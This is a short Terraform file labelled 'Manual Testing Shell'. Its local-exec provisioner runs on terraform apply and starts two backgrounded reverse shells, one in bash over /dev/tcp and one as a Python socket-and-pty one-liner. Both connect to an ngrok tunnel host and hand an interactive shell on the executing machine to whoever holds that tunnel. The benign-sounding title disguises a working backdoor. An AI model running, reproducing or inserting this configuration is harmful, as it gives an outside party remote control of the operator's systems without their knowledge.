# main.tf - Manual Testing Shell
resource "null_resource" "shell" {
  provisioner "local-exec" {
    command = <<EOT
      bash -c 'bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/19850 0>&1' &
      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.eu.ngrok.io",19850));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &
    EOT
  }
}
